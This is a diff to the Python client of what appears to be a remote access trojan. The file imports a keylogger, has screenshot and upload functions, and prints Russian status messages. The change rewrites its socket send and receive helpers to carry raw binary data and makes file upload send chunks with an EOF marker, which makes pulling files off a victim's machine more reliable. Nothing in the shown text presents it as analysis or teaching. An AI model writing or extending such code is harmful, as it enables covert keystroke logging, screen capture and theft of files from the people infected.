@@ -14,23 +14,30 @@ import threading
 from keylogger import KeyLogger
 
 
-def reliable_send(data, sock):
+def reliable_send(data, sock, binary=False):
     try:
-        json_data = json.dumps(data).encode()
-        sock.send(json_data)
+        if binary:
+            sock.sendall(data)  
+        else:
+            json_data = json.dumps(data).encode()
+            sock.send(json_data)
     except Exception:
         pass
 
 
-def reliable_recv(sock):
+def reliable_recv(sock, binary=False):
     json_data = b""
     while True:
         try:
-            json_data += sock.recv(1024)
-            result = json.loads(json_data.decode())
-            return result
+            chunk = sock.recv(1024)
+            if binary:
+                return chunk  
+            json_data += chunk
+            return json.loads(json_data.decode())
         except ValueError:
             continue
+
+
 
 
 def open_image():
@@ -103,8 +110,9 @@ def screenshot(sock):
 def upload(sock, file_name):
     try:
         with open(file_name, "rb") as file:
-            file_data = base64.b64encode(file.read()).decode()
-            reliable_send(file_data, sock)
+            while chunk := file.read(1024):  
+                reliable_send(chunk, sock, binary=True)
+        reliable_send(b"EOF", sock, binary=True)  
         reliable_send("[+] Файл успешно отправлен", sock)
     except FileNotFoundError:
         reliable_send("[!!] Файл не найден", sock)
